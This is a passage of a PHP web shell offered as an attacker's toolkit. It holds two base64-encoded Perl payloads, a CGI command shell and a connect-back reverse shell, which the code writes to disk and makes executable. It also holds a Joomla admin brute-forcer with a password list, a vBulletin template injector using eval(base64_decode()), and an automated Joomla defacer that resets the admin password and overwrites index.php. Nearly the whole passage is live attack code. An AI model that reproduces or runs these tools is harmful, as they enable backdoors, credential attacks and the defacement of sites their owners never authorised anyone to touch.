hZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlLiBJZiB0aGUKIyBmaWxlIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGEKIyBmaWxlLCBvdGhlcndpc2UgaXQgc3RhcnRzIHRoZSB1cGxvYWQgcHJvY2Vzcy4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgVXBsb2FkRmlsZQp7CgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgdXBsb2FkIGZvcm0gYWdhaW4KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpCgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCSZQcmludEZpbGVVcGxvYWRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7CgkJcmV0dXJuOwoJfQoJJlByaW50UGFnZUhlYWRlcigiYyIpOwoKCSMgc3RhcnQgdGhlIHVwbG9hZGluZyBwcm9jZXNzCglwcmludCAiPGNvZGU+VXBsb2FkaW5nICRUcmFuc2ZlckZpbGUgdG8gJEN1cnJlbnREaXIuLi48YnI+IjsKCgkjIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkCgljaG9wKCRUYXJnZXROYW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsKCSRUcmFuc2ZlckZpbGUgPX4gbSEoW14vXlxcXSopJCE7CgkkVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsKCgkkVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsKCSMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdAoJaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpCgl7CgkJcHJpbnQgIkZhaWxlZDogRGVzdGluYXRpb24gZmlsZSBhbHJlYWR5IGV4aXN0cy48YnI+IjsKCX0KCWVsc2UgIyBmaWxlIGlzIG5vdCBwcmVzZW50Cgl7CgkJaWYob3BlbihVUExPQURGSUxFLCAiPiRUYXJnZXROYW1lIikpCgkJewoJCQliaW5tb2RlKFVQTE9BREZJTEUpIGlmICRXaW5OVDsKCQkJcHJpbnQgVVBMT0FERklMRSAkaW57J2ZpbGVkYXRhJ307CgkJCWNsb3NlKFVQTE9BREZJTEUpOwoJCQlwcmludCAiVHJhbnNmZXJlZCAkVGFyZ2V0RmlsZVNpemUgQnl0ZXMuPGJyPiI7CgkJCXByaW50ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7CgkJfQoJCWVsc2UKCQl7CgkJCXByaW50ICJGYWlsZWQ6ICQhPGJyPiI7CgkJfQoJfQoJcHJpbnQgIjwvY29kZT4iOwoJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkmUHJpbnRQYWdlRm9vdGVyOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUuIElmIHRoZQojIGZpbGVuYW1lIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGEKIyBmaWxlLCBvdGhlcndpc2UgaXQgZGlzcGxheXMgYSBtZXNzYWdlIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsKIyB0aHJvdWdoICB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgRG93bmxvYWRGaWxlCnsKCSMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSBkb3dubG9hZCBmb3JtIGFnYWluCglpZigkVHJhbnNmZXJGaWxlIGVxICIiKQoJewoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsKCQkmUHJpbnRGaWxlRG93bmxvYWRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7CgkJcmV0dXJuOwoJfQoJCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwKCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUKCXsKCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7Cgl9CgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQoJewoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87CgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsKCX0KCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQoJewoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7Cgl9CgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQoJewoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgTWFpbiBQcm9ncmFtIC0gRXhlY3V0aW9uIFN0YXJ0cyBIZXJlCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KJlJlYWRQYXJzZTsKJkdldENvb2tpZXM7CgokU2NyaXB0TG9jYXRpb24gPSAkRU5WeydTQ1JJUFRfTkFNRSd9OwokU2VydmVyTmFtZSA9ICRFTlZ7J1NFUlZFUl9OQU1FJ307CiRMb2dpblBhc3N3b3JkID0gJGlueydwJ307CiRSdW5Db21tYW5kID0gJGlueydjJ307CiRUcmFuc2ZlckZpbGUgPSAkaW57J2YnfTsKJE9wdGlvbnMgPSAkaW57J28nfTsKCiRBY3Rpb24gPSAkaW57J2EnfTsKJEFjdGlvbiA9ICJsb2dpbiIgaWYoJEFjdGlvbiBlcSAiIik7ICMgbm8gYWN0aW9uIHNwZWNpZmllZCwgdXNlIGRlZmF1bHQKCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQKJEN1cnJlbnREaXIgPSAkaW57J2QnfTsKY2hvcCgkQ3VycmVudERpciA9IGAkQ21kUHdkYCkgaWYoJEN1cnJlbnREaXIgZXEgIiIpOwoKJExvZ2dlZEluID0gJENvb2tpZXN7J1NBVkVEUFdEJ30gZXEgJFBhc3N3b3JkOwoKaWYoJEFjdGlvbiBlcSAibG9naW4iIHx8ICEkTG9nZ2VkSW4pICMgdXNlciBuZWVkcy9oYXMgdG8gbG9naW4KewoJJlBlcmZvcm1Mb2dpbjsKfQplbHNpZigkQWN0aW9uIGVxICJjb21tYW5kIikgIyB1c2VyIHdhbnRzIHRvIHJ1biBhIGNvbW1hbmQKewoJJkV4ZWN1dGVDb21tYW5kOwp9CmVsc2lmKCRBY3Rpb24gZXEgInVwbG9hZCIpICMgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlCnsKCSZVcGxvYWRGaWxlOwp9CmVsc2lmKCRBY3Rpb24gZXEgImRvd25sb2FkIikgIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQp7CgkmRG93bmxvYWRGaWxlOwp9CmVsc2lmKCRBY3Rpb24gZXEgImxvZ291dCIpICMgdXNlciB3YW50cyB0byBsb2dvdXQKewoJJlBlcmZvcm1Mb2dvdXQ7Cn0K';
$file = fopen("izo.cin" ,"w+");
$write = fwrite ($file ,base64_decode($cgishellizocin));
fclose($file);
    chmod("izo.cin",0755);
$netcatshell = 'IyEvdXNyL2Jpbi9wZXJsDQogICAgICB1c2UgU29ja2V0Ow0KICAgICAgcHJpbnQgIkRhdGEgQ2hh
MHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQogICAgICBpZiAoISRBUkdWWzBdKSB7DQog
ICAgICAgIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogICAgICAgIGV4aXQo
MSk7DQogICAgICB9DQogICAgICBwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KICAg
ICAgJGhvc3QgPSAkQVJHVlswXTsNCiAgICAgICRwb3J0ID0gODA7DQogICAgICBpZiAoJEFSR1Zb
MV0pIHsNCiAgICAgICAgJHBvcnQgPSAkQVJHVlsxXTsNCiAgICAgIH0NCiAgICAgIHByaW50ICJb
Kl0gQ29ubmVjdGluZy4uLlxuIjsNCiAgICAgICRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3An
KSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0KICAgICAgc29ja2V0KFNFUlZFUiwgUEZf
SU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCiAg
ICAgIG15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KICAgICAgaWYgKCFjb25uZWN0KFNF
UlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogICAgICAgIGRpZSgi
VW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBTcGF3bmlu
ZyBTaGVsbFxuIjsNCiAgICAgIGlmICghZm9yayggKSkgew0KICAgICAgICBvcGVuKFNURElOLCI+
JlNFUlZFUiIpOw0KICAgICAgICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgICAgICAgb3Bl
bihTVERFUlIsIj4mU0VSVkVSIik7DQogICAgICAgIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAu
ICJcMCIgeCA0Ow0KICAgICAgICBleGl0KDApOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBE
YXRhY2hlZFxuXG4iOw==';
$file = fopen("dc.pl" ,"w+");
$write = fwrite ($file ,base64_decode($netcatshell));
fclose($file);
    chmod("dc.pl",0755);
   echo "<iframe src=cgitelnet1/izo.cin width=96% height=90% frameborder=0></iframe></div>"; }
 }
//////////////////////////////////////////////////////////////////////////////////////////////


elseif(isset($_GET['x']) && ($_GET['x'] == 'jbrute')) 
{ @ini_set('output_buffering',0); 
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=jbrute" method="post">

	<meta name="author" content="RetnOHacK" />
    <meta name="keywords" content="Joomla, Bruter, JoomlaBruter, JoomlaBruterForce, JoomlaBruterForceOnline" />
    <meta name="description" content="RetnOHacK #Procoder'z Team Albanian" />
<center>
</br></br>
<center><b><font color="lime">+--=[ Joomla Bruter Force ]=--+</font></b><br /><br />
<form method="post" action="" enctype="multipart/form-data"> 
<table class="tabnet" width="38%" border="0"><center>
<th colspan="2">Joomla Brute Force</th>
<tr><td><p ><font  class="d1">User :</font></th>
<input class="inputz" type='text' name="usr" value="admin" size="15"> </font></center><br /><br /></p>
</td></tr>
<tr><td><font class="">Sites list :</font> 
</td><td><font class="" >Pass list :</font></td></tr>
<tr>
		<td>
<textarea name="sites" style="background:black;" cols="40" rows="13" ></textarea>
</td><td>
<textarea name="w0rds" style="background:black;" cols="40" rows="13" >
admin
123456
password
102030
123123
12345
123456789
pass
test
admin123
demo
!@#$%^
</textarea>
</td></tr><center><tr><td>
<font > 
<input class="inputzbut" type="submit" name="x" value="start" id="d4"> 
</font></td></tr><br>
tanks for procoder'z team albanian<br></center></table>
</form></center>
<?php
@set_time_limit(0); 

if($_POST['x']){ 

echo "<hr>"; 

$sites = explode("\n",$_POST["sites"]); // Get Sites 
$w0rds = explode("\n",$_POST["w0rds"]); // Get w0rdLiSt 

$Attack = new Joomla_brute_Force(); // Active Class 


foreach($w0rds as $pwd){ 

foreach($sites as $site){ 


$Attack->check_it(txt_cln($site),$_POST['usr'],txt_cln($pwd)); // Brute :D 
flush();flush(); 

} 

} 

} 


# Class & Function'z 

function txt_cln($value){  return str_replace(array("\n","\r"),"",$value); } 

class Joomla_brute_Force{ 

public function check_it($site,$user,$pass){ // print result 

if(eregi('com_config',$this->post($site,$user,$pass))){ 

echo "<span class=\"x2\"><b># Success : $user:$pass -> <a href='$site/administrator/index.php'>$site/administrator/index.php</a></b></span><BR>";
$f = fopen("Result.txt","a+"); fwrite($f , "Success ~~ $user:$pass -> $site/administrator/index.php\n"); fclose($f); 
flush(); 
}else{ echo "# Failed : $user:$pass -> $site<BR>"; flush();} 

} 

public function post($site,$user,$pass){ // Post -> user & pass 

$token = $this->extract_token($site); 

$curl=curl_init(); 

curl_setopt($curl,CURLOPT_RETURNTRANSFER,1); 
curl_setopt($curl,CURLOPT_URL,$site."/administrator/index.php"); 
@curl_setopt($curl,CURLOPT_COOKIEFILE,'cookie.txt'); 
@curl_setopt($curl,CURLOPT_COOKIEJAR,'cookie.txt'); 
curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/2008111317  Firefox/3.0.4'); 
@curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1); 
curl_setopt($curl,CURLOPT_POST,1); 
curl_setopt($curl,CURLOPT_POSTFIELDS,'username='.$user.'&passwd='.$pass.'&lang=en-GB&option=com_login&task=login&'.$token.'=1'); 
curl_setopt($curl,CURLOPT_TIMEOUT,20); 

$exec=curl_exec($curl); 
curl_close($curl); 
return $exec; 

} 

public function extract_token($site){ // get token from source for -> function post 

$source = $this->get_source($site); 

preg_match_all("/type=\"hidden\" name=\"([0-9a-f]{32})\" value=\"1\"/si" ,$source,$token); 

return $token[1][0]; 

} 

public function get_source($site){ // get source for -> function extract_token 

$curl=curl_init(); 
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1); 
curl_setopt($curl,CURLOPT_URL,$site."/administrator/index.php"); 
@curl_setopt($curl,CURLOPT_COOKIEFILE,'cookie.txt'); 
@curl_setopt($curl,CURLOPT_COOKIEJAR,'cookie.txt'); 
curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/2008111317  Firefox/3.0.4'); 
@curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1); 
curl_setopt($curl,CURLOPT_TIMEOUT,20); 

$exec=curl_exec($curl); 
curl_close($curl); 
return $exec; 

} 

} 
}
////////////////////////////////////////////////////////////////////////////////////////////


 ///////////////////////////////////////////////////////////////////////////
 
 elseif(isset($_GET['x']) && ($_GET['x'] == 'jodexer'))
{	@ini_set('output_buffering',0); 
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=jodexer" method="post">
<br><br><center><b><font size=4>+--=[ Multi Index Changer ]=--+</font></b></center>
	<form method='post'><br><center><table class='tabnet'>
	<tr><th colspan='5'><b>Multi Index Changer</b></th></tr>
	<tr><th><b>Joomla Index Changer</b></th><th><b>VBulletin Index Changer</b></th></tr>
	<tr><td><input class='inputzbut' type='submit'name='jodexers' value="Joomla Index Changer" /></td><td>
	<input class='inputzbut' type='submit' name='vbic' value="VBulletin Index Changer" /></td></tr>
	</table></center></form><br><hr><br><br>
<?php

if(isset($_POST['vbic']))
{
?>
<div align="center">
   <H2><span style="font-weight: 400"><font face="Trebuchet MS" size="4">
   <b><font color="#00FF00">+--=[ VB Index Changer ]=--+</font></b>
   </div><br><br>
   <?php
   if(empty($_POST['index'])){
   echo "<center><FORM method=\"POST\">";
   echo "<table class=\"tabnet\">
<th colspan=\"2\">Vb Index Changer</th>
<tr><td>host </td><td><input class=\"inputz\" type=\"text\" size=\"60\" name=\"localhost\" value=\"localhost\"></td></tr>
<tr><td>database </td><td><input class=\"inputz\" type=\"text\" size=\"60\" name=\"database\" value=\"forum_vb\"></td></tr>
<tr><td>username </td><td><input class=\"inputz\" type=\"text\" size=\"60\" name=\"username\" value=\"user_vb\"></td></tr>
<tr><td>password </td><td><input class=\"inputz\" type=\"text\" size=\"60\" name=\"password\" value=\"vb\"></td></tr>
</tr>
<th colspan=\"2\">Your Index Code</th></table><table class=\"tabnet\">
<TEXTAREA name=\"index\" rows=\"13\" style=\"background:black\" border=\"1\" cols=\"69\" name=\"code\">your index code</TEXTAREA><br>
<INPUT class=\"inputzbut\" type=\"submit\" value=\"setting\" name=\"send\">
</FORM></table></center>";
    }else{
    $localhost = $_POST['localhost'];
    $database = $_POST['database'];
    $username = $_POST['username'];
    $password = $_POST['password'];
    $index = $_POST['index'];
    @mysql_connect($localhost,$username,$password) or die(mysql_error());
    @mysql_select_db($database) or die(mysql_error());
    $index=str_replace("\'","'",$index);
    $set_index = "{\${eval(base64_decode(\'";
    $set_index .= base64_encode("echo \"$index\";");
    $set_index .= "\'))}}{\${exit()}}</textarea>";
    echo("UPDATE template SET template ='".$set_index."' ") ;
    $ok=@mysql_query("UPDATE template SET template ='".$set_index."'") or die(mysql_error());
    if($ok){
    echo "!! update finish !!<br><br>";
    } 
  }
}
#=======================[ Multi Index Changer ]=======================#

if(isset($_POST['jodexers']))
{
 
	function randomt() {
    
        $chars = "abcdefghijkmnopqrstuvwxyz023456789";
        srand((double)microtime()*1000000);
        $i = 0;
        $pass = '' ;
    
        while ($i <= 7) {
            $num = rand() % 33;
            $tmp = substr($chars, $num, 1);
            $pass = $pass . $tmp;
            $i++;
        }
    
        return $pass;
    
    }
    function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1)
    {
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    $ar=trim($ar1[0]);
    return $ar;
    }
    if ($_POST['form_action'])
    {
    
    $text=file_get_contents($_POST['file']);
    $username=entre2v2($text,"public $user = '","';");
    $password=entre2v2($text,"public $password = ', '","';");
    $dbname=entre2v2($text,"public $db = ', '","';");
    $dbprefix=entre2v2($text,"public $dbprefix = '","';");
    $site_url=($_POST['site_url']);
    
    $h="<? echo(stripslashes(base64_decode('".urlencode(base64_encode(str_replace("'","'",($_POST['code']))))."'))); exit; ?>";
    
    $co=randomt();  
      /*
    echo($username);
    echo("<br>");
    echo($password);
    echo("<br>");
    echo($dbname);
    echo("<br>");
    echo($dbprefix);
    echo("<br>");
    */
    $co=randomt();
    
    if ($_POST['form_action'])
    {
    $h="<? echo(stripslashes(base64_decode('".urlencode(base64_encode(str_replace("'","'",($_POST['code']))))."'))); exit; ?>";
    
    
    
    
    
          $link=mysql_connect("dzoed.druknet.bt",$username,$password) ;
    
             mysql_select_db($dbname,$link) ;
    
    $tryChaningInfo = mysql_query("UPDATE ".$dbprefix."users SET username ='admin' , password = '2a9336f7666f9f474b7a8f67b48de527:DiWqRBR1thTQa2SvBsDqsUENrKOmZtAX'");
    echo("<br>[+] Changing admin password to 123456789");  
                    
                     $req =mysql_query("SELECT * from  `".$dbprefix."extensions` ");
                    
    if ( $req )
    {
    #################################################################
    ######################        V1.6         ######################
    #################################################################
    
                  
    $req =mysql_query("SELECT * from  `".$dbprefix."template_styles` WHERE client_id='0' and home='1'");
             $data = mysql_fetch_array($req);
    $template_name=$data["template"];
    
    $req =mysql_query("SELECT * from  `".$dbprefix."extensions` WHERE name='".$template_name."'");
             $data = mysql_fetch_array($req);
    $template_id=$data["extension_id"];
    
    $url2=$site_url."/index.php";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    
    
    $buffer = curl_exec($ch);
    
    $return=entre2v2($buffer ,'<input type="hidden" name="return" value="','"');
    $hidden=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',4);
    
    ///////////////////////////
    $url2=$site_url."/index.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456789&option=com_login&task=login&return=".$return."&".$hidden."=1");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $pos = strpos($buffer,"com_config");
    if($pos === false) {
    echo("<br>[-] Login Error");
    exit;
    }
    else {
    echo("<br>[~] Login Successful");
    }
    ///////////////////////////
    $url2=$site_url."/index.php?option=com_templates&task=source.edit&id=".base64_encode($template_id.":index.php");
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',2);
    if($hidden2) {
    echo("<br>[+] index.php file founded in Theme Editor");
    }
    else {
    echo("<br>[-] index.php Not found in Theme Editor");
    exit;
    }
    echo("<br>[*] Updating Index.php .....");
    $url2=$site_url."/index.php?option=com_templates&layout=edit";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"jform[source]=".$h."&jform[filename]=index.php&jform[extension_id]=".$template_id."&".$hidden2."=1&task=source.save");
    
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $pos = strpos($buffer,'<dd class="message message">');
    if($pos === false) {
    echo("<br>[-] Updating Index.php Error");
    exit;
    }
    else {
    echo("<br>[~] index.php successfully saved");
    }
    #################################################################
    ######################      V1.6  END      ######################
    #################################################################
    
    
    }
    else
    {
    
    #################################################################
    ######################      V1.5           ######################
    #################################################################
                    
    $req =mysql_query("SELECT * from  `".$dbprefix."templates_menu` WHERE client_id='0'");
             $data = mysql_fetch_array($req);
    $template_name=$data["template"];
    
    $url2=$site_url."/index.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $hidden=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',3);
    
    $url2=$site_url."/index.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456789&option=com_login&task=login&".$hidden."=1");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $pos = strpos($buffer,"com_config");
    
    if($pos === false) {
    echo("<br>[-] Login Error");
    exit;
    }
    else {
    echo("<br>[+] Login Successful");
    }
    ///////////////////////////
    $url2=$site_url."/index.php?option=com_templates&task=edit_source&client=0&id=".$template_name;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',6);
    
    if($hidden2) {
    echo("<br>[~] index.php file founded in Theme Editor");
    }
    else {
    echo("<br>[-] index.php Not found in Theme Editor");
    }
    
    echo("<br>[*] Updating Index.php .....");
    $url2=$site_url."/index.php?option=com_templates&layout=edit";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"filecontent=".$h."&id=".$template_name."&cid[]=".$template_name."&".$hidden2."=1&task=save_source&client=0");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
    $buffer = curl_exec($ch);
    
    $pos = strpos($buffer,'<dd class="message message fade">');
    if($pos === false) {
    echo("<br>[-] Updating Index.php Error");
    exit;
    }
    else {
    echo("<br>[~] index.php successfully saved");
    }
    #################################################################
    ######################      V1.5  END      ######################
    #################################################################
    
    }
    
    }
    
    
    function randomt() {
    
        $chars = "abcdefghijkmnopqrstuvwxyz023456789";
        srand((double)microtime()*1000000);
        $i = 0;
        $pass = '' ;
    
        while ($i <= 7) {
            $num = rand() % 33;
            $tmp = substr($chars, $num, 1);
            $pass = $pass . $tmp;
            $i++;
        }
    
        return $pass;
    
    }
    
    function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1)
    
    {
    
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    $ar=trim($ar1[0]);
    return $ar;
    }
    
    }?>
    <center>
    <font color="#00ff00" size='+3'><b>+--=[ Automatic Joomla Index Changer ]=--+</b></font><br><br><br>
    </center>
    <center><b>
    Link of symlink configuration.php of Joomla<br></b>
    <FORM action=""  method="post">
    <input type="hidden" name="form_action" value="1">
     <input type="text" class="inputz" size="60" name="file" value="http://site.com/sym/home/user/public_html/configuration.php">
    <br>
    <br><b>
    Admin Control panel url</b><br>
    <input type="text" class="inputz" size="40" name="site_url" value="http://site/administrator"><br>
    <br><b>
    Your Index Code</b>
    <br>
    <TEXTAREA rows="20" align="center" style="background:black" cols="120" name="code"> your index code
            </TEXTAREA>
            <br>
    <INPUT  class="inputzbut" type="submit" value="Lets Go Deface !!!" name="Submit">
    </FORM>
     </center>
    <script language=JavaScript>m='%09%09%09%09%09%09%09%3C/td%3E%0A%09%09%09%09%09%09%3C/tr%3E%0A%09%09%09%09%09%3C/table%3E%0A%09%09%09%09%3C/td%3E%0A%3C/html%3E';d=unescape(m);document.write(d);</script>
	<?php
}
}
///////////////////////////////////////////////////////////////////////////
 
elseif(isset($_GET['x']) && ($_GET['x'] == 'config'))
{	@ini_set('output_buffering',0); 
?>
